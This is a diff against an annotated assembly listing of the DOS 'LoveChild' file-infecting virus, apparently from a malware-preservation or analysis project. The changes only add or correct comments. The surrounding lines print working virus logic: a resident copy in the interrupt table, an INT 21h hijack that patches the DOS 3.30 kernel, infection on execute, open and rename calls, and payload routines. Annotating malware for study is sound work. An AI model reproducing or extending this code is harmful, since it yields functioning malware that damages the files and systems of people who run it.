@@ -8,7 +8,7 @@
 
 k_virus_memory_location:  equ 4 * 78h        ; resides in the interrupt table, starting from int 78h!!
 k_virus_infection_marker: equ 0FBh           ; STI, at the beginning of the file
-k_system_clock_addr:      equ 046Ch
+k_system_clock_addr:      equ 046Ch          ; BIOS timer tick counter (increments ~18.2 times/second)
 
 ; HOST ===========================================================================
 
@@ -61,7 +61,7 @@ int13_reset_for_dos_330:
 dos_330_int21_hijack:
                      mov     ax, 1203h
                      int     2Fh             ; Return: DS = segment of IBMDOS.COM/MSDOS.SYS
-                     mov     word [es: k_virus_memory_location + virus_body_end - virus_start], ds
+                     mov     word [es: k_virus_memory_location + virus_body_end - virus_start], ds ; save DOS data segment for later INT 21h calls
                      mov     si, 1460h       ; DOS 3.30 stores here the INT 21h address
                      mov     byte [si], 0EAh ; JMP FAR
                      mov     word [si+3], es ; 0
@@ -114,7 +114,7 @@ trojan:
 
 ; --------------------------------------------------------------------------------
 
-                     db 'LoveChild in reward for software sealing.'
+                     db 'LoveChild in reward for software sealing.' ; typo: "sTealing"
 
 payload_2:
                      test    byte [cs:k_system_clock_addr], 7
@@ -183,7 +183,7 @@ payload_3:
 evaluate_infection_C:
                      cmp     ah, 4Bh         ; execute?
                      jz      short handle_int24
-                     cmp     ah, 3Dh         ; read?
+                     cmp     ah, 3Dh         ; open file?
                      jz      short handle_int24
                      cmp     ah, 56h         ; rename?
                      jz      short handle_int24
@@ -294,6 +294,10 @@ prepare_for_int21_return:
                      pop     ax
 
 execute_original_int_21:
-                     jmp     0:1467h
+                     jmp     0:1467h         ; DOS 3.30: jumps to 0:1467h (original DOS INT 21h entry)
+                                             ; Generic DOS: segment (0) is overwritten with saved INT 21h segment
 
-virus_body_end:      equ $ - 2               ; the last 2 bytes are not copied, but used.
+virus_body_end:      equ $ - 2               ; Excludes last 2 bytes (JMP segment) from virus body.
+                                             ; Generic DOS path stores original INT 21h vector here during
+                                             ; installation (lines 75-78), overwriting the segment part of
+                                             ; the JMP instruction. DOS 3.30 path uses hardcoded 0:1467h.
